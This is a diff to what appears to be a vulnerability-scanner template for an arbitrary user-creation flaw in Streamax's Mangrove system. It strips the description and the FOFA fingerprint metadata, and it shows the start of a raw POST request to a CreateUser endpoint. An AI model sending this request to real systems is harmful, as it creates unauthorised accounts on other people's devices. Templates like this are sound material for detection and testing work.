@@ -3,12 +3,8 @@ info:
   name: 深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lft8u8xpgqaor754'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lft8u8xpgqaor754
-    fofa: icon_hash="564025728"
 http:
 - raw:
   - 'POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
